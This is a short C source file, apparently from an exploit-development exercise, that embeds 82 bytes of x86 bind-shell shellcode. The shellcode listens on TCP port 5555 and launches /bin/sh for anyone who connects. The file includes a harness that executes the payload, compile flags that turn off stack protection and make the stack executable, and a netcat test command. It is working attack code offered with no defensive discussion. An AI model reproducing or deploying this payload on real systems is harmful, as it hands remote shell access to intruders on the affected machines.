/**
* Filename: shellcode.c
* Author: h3ll0clar1c3
* Purpose: Bind shellcode on TCP port 5555, spawn a shell on incoming connection  
* Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shell_bind_tcp_final  
* Usage: ./shell_bind_tcp_final
* Testing: nc 127.0.0.1 5555
* Shellcode size: 82 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

int main(void)
{
unsigned char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x02\xb1\x01\xcd\x80\x89\xc7"
"\x31\xc0\xb0\x66\x89\xfb\x31\xc9\x51\x51\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31"
"\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31"
"\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50"
"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

    printf("Shellcode length: %d\n", strlen(code));

    void (*s)() = (void *)code;
    s();

    return 0;
}